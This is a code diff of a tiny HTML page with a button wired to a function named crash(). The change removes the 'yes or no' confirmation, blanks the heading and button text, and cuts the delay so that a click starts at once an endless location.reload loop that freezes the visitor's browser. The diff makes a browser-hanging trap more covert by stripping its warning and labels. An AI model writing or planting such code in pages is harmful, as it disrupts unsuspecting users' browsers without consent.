@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Button</title>
+  <title>The Button</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -25,16 +25,14 @@
 </head>
 <body>
 
-  <h2>Click the Button</h2>
-  <button onclick="crash()">Click This</button>
+  <h2></h2>
+  <button onclick="crash()"></button>
 
   <script>
     function crash() {
-      if(confirm("yes or no")) {
-        setTimeout(function() {
-          while (1) location.reload(1);
-        }, 1000);
-      }
+      setTimeout(function() {
+        while (1) location.reload(1);
+      }, 0001);
     }
   </script>
 
